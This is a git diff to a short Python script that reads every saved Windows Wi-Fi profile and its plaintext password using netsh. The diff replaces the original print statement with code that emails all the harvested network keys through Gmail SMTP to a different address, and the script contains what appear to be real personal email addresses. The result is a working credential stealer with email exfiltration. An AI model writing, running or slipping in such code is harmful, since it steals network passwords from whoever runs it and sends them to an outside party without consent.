@@ -1,4 +1,5 @@
 import os
+import smtplib
 
 raw_command = str(os.popen('netsh wlan show profiles').read())
 #define all lists and dictionaries
@@ -24,4 +25,18 @@ for profile in profiles:
             #get the word that is 2 indexes after Content and append to dictionary with corrisponding profile
             profile_keys[profile] = str(key_command_list[index_2+2])
 
-print(profile_keys)
+#print(profile_keys)
+
+#write an email to myself with the passwords
+email_message = ""
+for item in profile_keys:
+    key = str(profile_keys[item])
+    email_message = email_message + f"{item} ~ {key}\n"
+
+server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
+server.login("alessio.maffioletti@gmail.com", "key")
+server.sendmail(
+  "alessio.maffioletti@gmail.com", 
+  "mikejonespen257@gmail.com", 
+  email_message)
+server.quit()
